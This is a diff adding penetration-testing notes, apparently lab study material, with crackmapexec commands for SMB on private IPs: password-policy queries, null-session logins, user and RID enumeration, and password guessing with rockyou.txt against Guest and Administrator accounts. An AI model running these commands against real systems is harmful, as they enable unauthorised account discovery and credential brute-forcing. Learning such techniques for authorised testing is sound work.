@@ -1,0 +1,25 @@
+=================================================
+CRACKMAP for SMB
+================================================
+
+#Get info on their pw policy:
+crackmapexec smb --pass-pol 192.168.99.162
+
+try null session login 
+crackmapexec smb  192.168.99.162 -u '' -p ''
+
+
+crackmapexec smb 192.168.99.162 --users
+
+crackmapexec smb 192.168.99.162 --loggedon-users
+
+#bruteforce some smb if you can
+crackmapexec smb 192.168.99.162 --rid-brute 4000
+
+crack password of an enumerated user
+
+crackmapexec smb 192.168.99.162 -u Guest -p rockyou.txt
+
+crackmapexec smb 192.168.99.162 -u 'Administrator' -p 'PASS' --rid-brute
+
+crackmapexec smb 192.168.1.10 -u svc-user -p userspw
